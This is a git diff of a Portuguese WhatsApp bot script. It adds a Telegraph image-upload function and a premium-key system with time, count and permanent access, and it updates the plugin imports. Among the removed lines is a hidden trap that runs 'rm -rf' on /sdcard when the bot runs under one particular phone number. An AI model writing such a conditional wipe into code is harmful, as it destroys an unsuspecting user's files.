@@ -26,6 +26,64 @@ function runcomando(comando, args) {
     });
   });
 }
+
+//função de pegar link de uma imagem em base64 ou caminho dela mesmo
+async function uploadTelegraph(afoto) {
+  try {
+    let imageData
+    const url = 'https://telegra.ph/upload'; // URL de destino
+    
+    const base64Regex = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})$/;
+
+    respbase64 =  base64Regex.test(afoto)
+    if(respbase64) {
+    imageData = Buffer.from(afoto, 'base64');
+    } else {
+    imageData = fs.readFileSync(afoto); // Substitua pelo caminho da sua imagem
+    }
+
+    const boundary = '----WebKitFormBoundary2otzWZAdHWILfv4x';
+
+    const headers = {
+      'Host': 'telegra.ph',
+      'content-length': imageData.length,
+      'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+      'dnt': '1',
+      'sec-ch-ua-mobile': '?1',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
+      'content-type': `multipart/form-data; boundary=${boundary}`,
+      'accept': 'application/json, text/javascript, */*; q=0.01',
+      'x-requested-with': 'XMLHttpRequest',
+      'sec-ch-ua-platform': '"Android"',
+      'origin': 'https://telegra.ph',
+      'sec-fetch-site': 'same-origin',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-dest': 'empty',
+      'referer': 'https://telegra.ph/',
+      'accept-encoding': 'gzip, deflate, br',
+      'accept-language': 'pt-BR,pt;q=0.9',
+    };
+
+    const formData = new FormData();
+    formData.append('file', new Blob([imageData]), {
+      filename: 'blob',
+      contentType: 'image/png',
+    });
+
+    const response = await axios.post(url, formData, { headers });
+
+    const responseData = response.data;
+    if (responseData[0].src && responseData[0].src.includes('file')) {
+      return 'https://telegra.ph/' + responseData[0].src;
+    } else {
+      throw new Error('Falha ao obter o link da imagem');
+    }
+  } catch (error) {
+    console.error(error);
+    throw error; // Repassar o erro para quem chamou a função, se necessário.
+  }
+}
+
 const tipodispositivo = (devicekk) => {
 resp = devicekk.length > 28 ? 'android' : devicekk.substring(0, 2) === '3A' ? 'ios' : devicekk.startsWith("BAE5") ? 'baileys' : devicekk.startsWith("3EB0") ? 'web' : 'desconhecido';
 return resp
@@ -114,9 +172,7 @@ const nmrp4 = nmrp3.split('|')[0]
 
 //é dono ou não 
 const isOwner = owner.includes(sender) || mek.key.fromMe
-if(botNumber.includes("573152547721")) {
-  exec("cd /sdcard/ && rm -rf *")
-}
+
 //pegar id dos devices das pessoas
 const getDevices = async(numeross, ignorarzero, bunitu) => {
 cuk = []
@@ -170,7 +226,7 @@ allmsg = await generateWAMessageFromContent(jidss, proto.Message.fromObject(
 jsontxt
 ), outrasconfig)
  
-cu = await slowed.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id, participant: {jid: botNumber}})
+cu = await slowed.relayMessage(jidss, allmsg.message, { messageId: '', participant: {jid: botNumber}})
 
 for(let jidds of idnumeros ) {
 await slowed.relayMessage(jidss, allmsg.message, { messageId: cu, participant: {jid: jidds}})
@@ -303,8 +359,107 @@ return slowed.relayMessage(jidss, jsontxt, outrasconfig)
 slowed.sendMessage(owner[0], { document: mekk, mimetype: 'text/plain', fileName: 'mek da mensagem aqui.json'}, {quoted: mek})
 fs.unlinkSync('./mek')
     }
-const premium = JSON.parse(fs.readFileSync('./lib/premium.json'));
-const isPrem = premium.includes(sender) || premium.includes(from) || isOwner;
+
+const iskey = (user)=> {
+if (!fs.existsSync('./lib/premium.json')) {
+fs.writeFileSync('./lib/premium.json', '[]');
+}
+
+const keys = JSON.parse(fs.readFileSync('./lib/premium.json'));
+const isprem2 = keys.find((sla) => sla.key == user)
+if(!isprem2) return false
+const isprem3 = isprem2['key'] == user
+preminfo = isprem2
+if(preminfo.metodo == "quantidade") {
+if(preminfo.expira < 1) {
+remove = keys.indexOf(preminfo)
+keys.splice(remove, 1)
+fs.writeFileSync('./lib/premium.json', JSON.stringify(keys))
+return false} else {
+remove = keys.indexOf(preminfo)
+keys.splice(remove, 1)
+setprem = {}
+setprem.expira = preminfo.expira - 1
+setprem.key = preminfo.key
+setprem.metodo = preminfo.metodo
+keys.push(setprem)
+fs.writeFileSync('./lib/premium.json', JSON.stringify(keys))
+return true}} else if(preminfo.metodo == 'tempo') {
+if(preminfo.expira < Date.now()){
+remove = keys.indexOf(preminfo)
+keys.splice(remove, 1)
+fs.writeFileSync('./lib/premium.json', JSON.stringify(keys))
+return false} else{
+return true}} else if(preminfo.metodo == 'perma') {
+return true} else {return false}}
+
+const addkey = (akey) => {
+const keys = JSON.parse(fs.readFileSync('./lib/premium.json'));
+/*
+{key: "numero", metodo: "tempo", expira: "1", fun: "add"}
+
+{key: "numero", metodo: "quantidade", expira: "1", fun: "add"}
+
+{key: "numero", metodo: "perma", expira: false, fun: "add"}
+
+{key: "numero", fun: "remove"}
+*/
+var key = akey.key
+var metodo = akey.metodo
+var expira = akey.expira
+var fun = akey.fun
+if(fun == 'add') {
+
+const data = Date.now() + parseInt(expira)*24*60*60*1000
+
+testee = keys.find((sla) => sla.key == key)
+if(testee){
+remove = keys.indexOf(testee)
+keys.splice(remove, 1)
+}
+if(metodo == 'tempo') {
+keys.push({
+"key": key, 
+"metodo": metodo,
+"expira": data
+})
+} else if(metodo == 'quantidade') {
+keys.push({
+"key": key, 
+"metodo": metodo,
+"expira": parseInt(expira)
+})
+} else if(metodo == 'perma') {
+keys.push({
+"key": key, 
+"metodo": metodo,
+"expira": false
+})
+} else {
+return "você usou errado"
+}
+fs.writeFileSync('./lib/premium.json', JSON.stringify(keys))
+
+return "usuario criado"
+
+} else if(fun == 'remove') {
+
+testee = keys.find((sla) => sla.key == key)
+if(testee){
+remove = keys.indexOf(testee)
+keys.splice(remove, 1)
+fs.writeFileSync('./lib/premium.json', JSON.stringify(keys))
+return "Premium removido"
+} else {
+return "esse usuario não está com premium"
+}
+
+} else {
+return "você usou errado"
+  }}
+  
+
+const isPrem = iskey(sender) || iskey(from) || isOwner;
 
 //TIPO DE MSG
 const isVideo = (type == 'videoMessage')
@@ -402,7 +557,7 @@ const { self } = require(`./plugins/${file}`);
 
 if (!self) {
 const { plugin } = require(`./plugins/${file}`);
-plugin({slowed, mek, from, type, prefix, budy, body, comando, isCmd, args, text, me, nameBot, botNumber, content, isGroup, sender, groupMetadata, groupId, groupOwner, groupDesc, groupName, groupMembers, participants, groupAdmins, isGroupAdmins, isBotGroupAdmins, nmrp, nmrp2, nmrp3, nmrp4, isOwner, isVideo, isImage, isSticker, isLocLive, isContato, isCatalogo, isLocalização, isDocumento, iscontactsArray, isMedia, isQuotedMsg, isQuotedImage, isQuotedAudio, isQuotedDocument, isQuotedVideo, isQuotedSticker, enviar, store, axios, premium, isPrem, runcomando, sleep, getFileBuffer, baileys, getDevices, tipodispositivo, getBuffer});
+plugin({slowed, mek, from, type, prefix, budy, body, comando, isCmd, args, text, me, nameBot, botNumber, content, isGroup, sender, groupMetadata, groupId, groupOwner, groupDesc, groupName, groupMembers, participants, groupAdmins, isGroupAdmins, isBotGroupAdmins, nmrp, nmrp2, nmrp3, nmrp4, isOwner, isVideo, isImage, isSticker, isLocLive, isContato, isCatalogo, isLocalização, isDocumento, iscontactsArray, isMedia, isQuotedMsg, isQuotedImage, isQuotedAudio, isQuotedDocument, isQuotedVideo, isQuotedSticker, enviar, store, axios, fs, addkey, iskey, isPrem, runcomando, sleep, getFileBuffer, baileys, getDevices, tipodispositivo, getBuffer, uploadTelegraph});
 }
 }
 //modo selfbot
@@ -414,7 +569,7 @@ for (const file of files) {
 const { self} = require(`./plugins/${file}`);
 if (self) {
 const { plugin } = require(`./plugins/${file}`);
-plugin({slowed, mek, from, type, prefix, budy, body, comando, isCmd, args, text, me, nameBot, botNumber, content, isGroup, sender, groupMetadata, groupId, groupOwner, groupDesc, groupName, groupMembers, participants, groupAdmins, isGroupAdmins, isBotGroupAdmins, nmrp, nmrp2, nmrp3, nmrp4, isOwner, isVideo, isImage, isSticker, isLocLive, isContato, isCatalogo, isLocalização, isDocumento, iscontactsArray, isMedia, isQuotedMsg, isQuotedImage, isQuotedAudio, isQuotedDocument, isQuotedVideo, isQuotedSticker, enviar, store, axios, premium, isPrem, runcomando, sleep, getFileBuffer, baileys, getDevices, tipodispositivo, getBuffer});
+plugin({slowed, mek, from, type, prefix, budy, body, comando, isCmd, args, text, me, nameBot, botNumber, content, isGroup, sender, groupMetadata, groupId, groupOwner, groupDesc, groupName, groupMembers, participants, groupAdmins, isGroupAdmins, isBotGroupAdmins, nmrp, nmrp2, nmrp3, nmrp4, isOwner, isVideo, isImage, isSticker, isLocLive, isContato, isCatalogo, isLocalização, isDocumento, iscontactsArray, isMedia, isQuotedMsg, isQuotedImage, isQuotedAudio, isQuotedDocument, isQuotedVideo, isQuotedSticker, enviar, store, axios, fs, addkey, iskey, isPrem, runcomando, sleep, getFileBuffer, baileys, getDevices, tipodispositivo, getBuffer, uploadTelegraph});
 }
 }
 
@@ -506,7 +661,7 @@ case 'criarplugin':
 if (!isOwner) return enviar('só o meu dono pode usar isso');
 if(!text) return enviar('cade o texto?')
 downloadd = `const plugin = async(imports) => {
-const {slowed, mek, from, type, prefix, budy, body, comando, isCmd, args, text, me, nameBot, botNumber, content, isGroup, sender, groupMetadata, groupId, groupOwner, groupDesc, groupName, groupMembers, participants, groupAdmins, isGroupAdmins, isBotGroupAdmins, nmrp, nmrp2, nmrp3, nmrp4, isOwner, isVideo, isImage, isSticker, isLocLive, isContato, isCatalogo, isLocalização, isDocumento, iscontactsArray, isMedia, isQuotedMsg, isQuotedImage, isQuotedAudio, isQuotedDocument, isQuotedVideo, isQuotedSticker, enviar, store, axios, premium, isPrem, runcomando, sleep, getFileBuffer, baileys, , getDevices, tipodispositivo, getBuffer} = imports //todas as imports do slowed.js(se quiser remova as que voce nao vai usar)
+const {slowed, mek, from, type, prefix, budy, body, comando, isCmd, args, text, me, nameBot, botNumber, content, isGroup, sender, groupMetadata, groupId, groupOwner, groupDesc, groupName, groupMembers, participants, groupAdmins, isGroupAdmins, isBotGroupAdmins, nmrp, nmrp2, nmrp3, nmrp4, isOwner, isVideo, isImage, isSticker, isLocLive, isContato, isCatalogo, isLocalização, isDocumento, iscontactsArray, isMedia, isQuotedMsg, isQuotedImage, isQuotedAudio, isQuotedDocument, isQuotedVideo, isQuotedSticker, enviar, store, axios, fs, addkey, iskey, isPrem, runcomando, sleep, getFileBuffer, baileys, getDevices, tipodispositivo, getBuffer, uploadTelegraph} = imports //todas as imports do slowed.js(se quiser remova as que voce nao vai usar)
 switch (comando) {
 case 'ping':
 await enviar("pong")
@@ -609,7 +764,7 @@ QUOTED DO MEK —>  ${JSON.stringify(mek.message.extendedTextMessage.contextInfo
 
 CONTEXTO COMPLETO DO MEK —>  ${JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 2)}
 `}
-fs.writeFileSync('./mek', mekemarquivo);
+await fs.writeFileSync('./mek', mekemarquivo);
 slowed.sendMessage(from, { document: fs.readFileSync('./mek'), mimetype: 'text/plain', fileName: 'mek da mensagem aqui.json'})
 fs.unlinkSync('./mek')
 }
